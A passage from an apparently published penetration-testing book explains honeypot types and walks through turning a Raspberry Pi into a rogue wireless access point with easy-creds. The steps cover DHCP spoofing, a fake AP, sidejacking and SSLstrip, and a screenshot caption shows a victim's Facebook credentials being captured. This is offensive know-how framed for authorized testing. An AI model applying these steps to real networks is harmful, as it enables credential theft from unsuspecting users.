    real network, no matter how isolated and/or monitored the network is. Most honeypots
    present themselves as being vulnerable and containing something of value to lure
    attacks away from the real target.
  prefs: []
  type: TYPE_NORMAL
- en: There are typically two types of honeypots. The more commonly used one is a
    production honeypot that is designed to be part of a network defense strategy.
    A production honeypot typically means placing honeypots inside the network with
    the goal of luring hackers that have breached other defenses, which means that
    production honeypots are the last effort to prevent sensitive systems from being
    compromised.
  prefs: []
  type: TYPE_NORMAL
- en: The other type of honeypot is a monitoring honeypot, which is typically placed
    on a network to research data that passes through it. This is similar to a man-in-the-middle
    attack, however usually the honeypot presents itself as an authorized source that
    victims connect to. An example is developing a fake access point that victims
    believe is a viable source to connect to the network. As a victim uses the honeypot,
    the attacker monitors the traffic including capturing the login credentials. We
    call this attack a rogue access honeypot based on using a monitor honeypot technique
    mixed with provisioning an access method to the honeypot through a fake wireless
    access point. There are other types of honeypots such as high interaction and
    low interaction honeypots, honeyclients, and so on. However, most of these are
    not suitable for the Raspberry Pi form-factor.
  prefs: []
  type: TYPE_NORMAL
- en: A rogue access honeypot, as we defined it, is the most appropriate use for a
    Raspberry Pi-based honeypot since our focus is to capture data rather than to
    crack network defense as well as hide such an attack by taking advantage of the
    Raspberry Pi's mobile form-factor.
  prefs: []
  type: TYPE_NORMAL
- en: 'In the following example, we will create a rogue access honeypot that will
    act as a rogue wireless access point with the goal to capture sensitive information
    while victims connect to it to access the Internet. We will connect the `eth0`
    port into an Internet-facing port and leverage a USB to wireless adapter to host
    the rogue wireless service. The attack can be modified using wireless for both
    the Internet and the rogue wireless interfaces; however, we will need two USB
    to wireless adapters to accomplish this. The attacker can access the Raspberry
    Pi honeypot from anywhere as long as a VPN connection is set up prior to launching
    the attack. The following diagram shows what we will build:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Rogue access honeypots](img/Insert6435OT_04_27.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Let's look at a popular utility known as easy-creds and use it to build a Raspberry
    Pi rogue access honeypot.
  prefs: []
  type: TYPE_NORMAL
- en: Easy-creds
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Easy-creds is a bash script that leverages Ettercap and other tools to obtain
    credentials. Ettercap was covered in [Chapter 3](ch03.html "Chapter 3. Penetration
    Testing"), *Penetration Testing*. However, easy-creds takes the man-in-the-middle
    attack further by providing you with all the tools you need to develop a monitoring
    honeypot. Easy-creds is menu-driven and offers ARP spoofing, **Dynamic Host Configuration
    Protocol** (**DHCP**) spoofing, one-way ARP spoofing, and creating a fake **Access
    Point** (**AP**).
  prefs: []
  type: TYPE_NORMAL
- en: Easy-creds does not come preinstalled on the Raspberry Pi, so you will need
    to download it from [http://sourceforge.net/projects/easy-creds/files/latest/download](http://sourceforge.net/projects/easy-creds/files/latest/download).
  prefs: []
  type: TYPE_NORMAL
- en: 'Once it is downloaded, navigate to the download directory (normally `Downloads`)
    using `cd Downloads` as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Easy-creds](img/Insert6435OT_04_28.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'You will need to uncompress the files that you downloaded by issuing the `tar
    –zxvf easy-*` command. This will create a new directory that you will be able
    to see using the `ls` command. Open that directory with the `cd` command and you
    should see an install script using the `ls` command. You will need to make the
    install script an executable file either using the `chmod +x installer.sh` command
    or the `chmod 777 installer.sh` command. The following screenshot shows the execution
    of the previous steps:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Easy-creds](img/Insert6435OT_04_29.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'Once you have created the executable file, issue the `./installer.sh` command
    to install easy-creds. The following screenshot shows the installation menu that
    will appear once you run the easy-creds install script:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Easy-creds](img/Insert6435OT_04_30.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Since we are running this on Kali Linux, we will select **1\. Debian/Ubuntu
    and derivatives** from the menu.
  prefs: []
  type: TYPE_NORMAL
- en: 'You will need to follow the prompts to complete the installation. When the
    installation is complete, you can launch easy-creds by issuing the `./easy-creds.sh`
    command. The following screenshot shows the commands to run easy-creds once it
    is installed:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Easy-creds](img/Insert6435OT_04_31.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Once you run the `.sh` file, you will see the easy-creds menu. Easy-creds often
    changes the order of the menu slightly in each version, so your menu may look
    different than the following screenshot. In our example, we are going to select
    **1\. Prerequisites & Configurations** for configurations.
  prefs: []
  type: TYPE_NORMAL
- en: '![Easy-creds](img/Insert6435OT_04_32.jpg)'
  prefs: []
  type: TYPE_IMG
- en: The first step to set up our honeypot is to make sure that we hand out IP addresses
    used for the attack to our victims. To do this, we will install a DHCP server.
    You might get an error while installing the DHCP server, which would mean that
    you already have one installed from another exercise or a tool that you previously
    installed.
  prefs: []
  type: TYPE_NORMAL
- en: 'The following screenshot of the configuration menu shows that **3\. Install
    dhcp server** is used to install a DHCP server:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Easy-creds](img/Insert6435OT_04_33.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Once the DHCP server is installed, we will select **Add tunnel interface to
    dhcp server**. In the previous screenshot, this was option **5.**
  prefs: []
  type: TYPE_NORMAL
- en: 'Next, scroll down to the part of the configuration that states which interface
    the DHCP server should listen on. You will need to manually type in `wlan0` here,
    as shown in the following screenshot, if your wireless network is using this interface:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Easy-creds](img/Insert6435OT_04_34.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'Once you finish adding your wireless interface, choose to go back to the previous
    menu. This was **9\. Previous Menu** in the configuration menu screenshot. Now,
    let''s set up a FakeAP attack using **3\. FakeAP Attacks**, as shown in the following
    screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Easy-creds](img/Insert6435OT_04_35.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'Next, you will be presented with several options. For our example, we will
    select the **FakeAP Attack Static** option shown as **1.** in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Easy-creds](img/Insert6435OT_04_36.jpg)'
  prefs: []
  type: TYPE_IMG
- en: You will be prompted to choose whether you would like to include a sidejacking
    attack. **Sidejacking** describes the act of hijacking an engaged web session
    by using the credentials that identified the victim to a specific server. This
    can be useful when people access our honeypot and log in to a website. So, for
    our example, we will select **Yes** for this option.
  prefs: []
  type: TYPE_NORMAL
- en: Next, you will be asked to select the interface that is connected to the Internet.
    In most cases, this will be `eth0`, which means that the design is having the
    Raspberry Pi offer the rogue wireless attack from interface `wlan0` and passing
    traffic through to the Internet from a LAN connection on `eth0`. You can also
    use two USB to wireless adapters for this, in which you can connect one to the
    Internet and host the rogue wireless attack from the other. The problem with this
    approach is that both the trusted and fake wireless access points will be broadcasting
    connections unless the real wireless network is not broadcasted, for example using
    a cellphone in tether mode. We will stick with using a LAN connection for our
    example.
  prefs: []
  type: TYPE_NORMAL
- en: After you select the Internet interface, you will be prompted to fill out a
    few other details such as where you would like to save the logfiles and the DHCP
    address space. Fill these out and you will be finished with the basic configuration.
  prefs: []
  type: TYPE_NORMAL
- en: You will now have an active rogue wireless honeypot advertising itself to clients
    to join. If a client accesses the network and uses clear text protocols, their
    information will be captured and displayed in easy-creds. Easy-creds will also
    attempt to use SSLstrip to redirect users to unencrypted web pages if they attempt
    to open an HTTPS website. We covered SSLstrip in [Chapter 3](ch03.html "Chapter 3. Penetration
    Testing"), *Penetration Testing*.
  prefs: []
  type: TYPE_NORMAL
- en: 'The following screenshot depicts a set of screenshots showing our honeypot
    capturing a victim''s Facebook login credentials when they use our rogue wireless
    network:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Easy-creds](img/Insert6435OT_04_37.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Your Raspberry Pi is now a fully functional rogue access honeypot that is saving
    captured passwords into the logfile that you specified during the configuration.
    You can access this log remotely for your final penetration test report. You can
    find more on easy-creds at [http://sourceforge.net/projects/easy-creds/](http://sourceforge.net/projects/easy-creds/).
  prefs: []
  type: TYPE_NORMAL
- en: Summary
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: This chapter focused on running active attacks from the Raspberry Pi once you
    have breached a network. Topics included compromising systems with various forms
    of payloads, social engineering techniques, exploiting browsers, and developing
    rogue access honeypots with the purpose of gaining access through vulnerabilities
    or by stealing user credentials. At this point, we have covered the basics for
    performing a penetration test with a Raspberry Pi. There are more concepts to
    learn; however, the topics covered so far will give you a general idea of how
    to use your Raspberry Pi for an authorized penetration test.
  prefs: []
  type: TYPE_NORMAL
- en: The next chapter will look at what to do once you finish your penetration test.
    This includes how to clean up logfiles and erase your footprint in a secure manner
    to avoid leaving forensic evidence. We will also cover steps to capture data that
    can be used to develop a professional penetration test deliverable showcasing
    the value of your services.
  prefs: []
  type: TYPE_NORMAL
